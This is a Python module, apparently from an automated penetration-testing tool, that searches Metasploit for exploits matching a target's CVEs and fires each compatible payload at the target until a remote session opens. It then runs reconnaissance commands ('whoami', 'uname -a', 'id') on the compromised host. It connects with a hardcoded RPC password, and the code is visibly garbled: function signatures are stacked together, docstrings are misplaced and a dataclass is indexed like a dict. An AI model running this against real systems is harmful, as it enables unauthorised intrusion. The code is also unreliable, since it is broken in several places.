import socket
from time import sleep
from dataclasses import dataclass
from typing import Any, Dict, List

from pymetasploit3.msfrpc import MsfRpcClient

from modules.exploit_search import search_exploits
from modules.searchvuln import VulnerableSoftware

client = MsfRpcClient('password', ssl=True)

@dataclass
class MetasploitVulnerability:
    name: str
    fullname: str
    type: str

def search_metasploit(keyword: str, log) -> List[MetasploitVulnerability]:
def exploit_vulnerability(vulnerability: VulnerableSoftware, target: str, log) -> None:
    Searches Metasploit for exploits related to the given keyword.
    
    Args:
        keyword (str): The keyword to search for.

    Returns:
        list: A list of MetasploitVulnerability objects representing the exploits.
    """
    exploits = []
    results = client.modules.search(keyword)
    
    for result in results:
        if result['type'] == 'exploit':
            exploits.append(MetasploitVulnerability(
                name=result['name'],
                fullname=result['fullname'],
                type=result['type']
            ))
    
    log.logger("info", f"Found {len(exploits)} exploits for {keyword}")
    return exploits

def combined_metasploit_search(vulnerability: VulnerableSoftware, log) -> List[MetasploitVulnerability]:
    """
    Generates keywords from the vulnerability and searches Metasploit for related exploits.
    
    Args:
        vulnerability (VulnerableSoftware): The vulnerability to generate keywords from.
        log: Logger object for logging.

    Returns:
        list: A list of MetasploitVulnerability objects representing the exploits.
    """
    keywords = set(vulnerability.CVEs + [vulnerability.title])
    exploits = []

    for keyword in keywords:
        results = client.modules.search(keyword)
        for result in results:
            if result['type'] == 'exploit':
                exploits.append(MetasploitVulnerability(
                    name=result['name'],
                    fullname=result['fullname'],
                    type=result['type']
                ))
    
    log.logger("info", f"Found {len(exploits)} exploits for {keywords}")
    return exploits
    """
    Exploit a given vulnerability on the target.

    :param vulnerability: A VulnerableSoftware object containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    """
    print("CVEID: ", vulnerability.CVEs[0])
    exploit_names = combined_metasploit_search(vulnerability, log)

    for exploit in exploit_names:
        log.logger("info", f"Using exploit {exploit.fullname} on {target}")
        exploit_module = client.modules.use('exploit', exploit['fullname'])
        hostname = socket.gethostname()
        IPAddrUser = socket.gethostbyname(hostname)
        if 'LHOST' in exploit_module.options:
            exploit_module['LHOST'] = IPAddrUser

        if 'RHOSTS' in exploit_module.options:
            exploit_module['RHOSTS'] = target

        compatible_payloads = exploit_module.targetpayloads()

        for payload_name in compatible_payloads:
            try:
                payload = client.modules.use('payload', payload_name)
                exploit_module.execute(payload=payload)
                sleep(2)  # Wait for the session to be created
                sessions = client.sessions.list

                if sessions:
                    log.logger("info", f"Session created with exploit {exploit['fullname']} and payload {payload_name}")
                    session_id = max(sessions.keys())
                    shell = client.sessions.session(session_id)
                    commands = ['whoami', 'uname -a', 'id']

                    for command in commands:
                        shell.write(command)
                        response = shell.read()
                        log.logger("info", f"Command: {command}\nResponse: {response}")

                    return  # Exit once a session is created

                log.logger("error", f"Failed to create session for exploit {exploit['fullname']} using payload {payload_name}")

            except Exception as e:
                log.logger("error", f"Failed to execute payload {payload_name}: {e}")
                continue

def exploit_vulnerabilities(vulnerabilities: List[VulnerableSoftware], target: str, log, console, max_exploits: int = 10) -> None:
    """
    Exploit a list of vulnerabilities on the target.
    
    :param vulnerabilities: A list of VulnerableSoftware objects containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    :param console: Rich console object for displaying status.
    :param max_exploits: Maximum number of exploits to attempt.
    """
    exploited_cves = set()
    
    for vulnerability in vulnerabilities:
        if vulnerability.CVEs[0] in exploited_cves:
            #log.logger("info", f"Skipping already exploited CVE: {vulnerability.CVEs[0]}")
            continue
        exploited_cves.add(vulnerability.CVEs[0])
        with console.status(f"[white]Exploiting[/white] [red]{vulnerability.CVEs[0]}[/red] [white]...[/white]", spinner="bouncingBar") as status:
            exploit_vulnerability(vulnerability, target, log)
            sleep(1)  # Adding a delay to ensure proper logging and execution
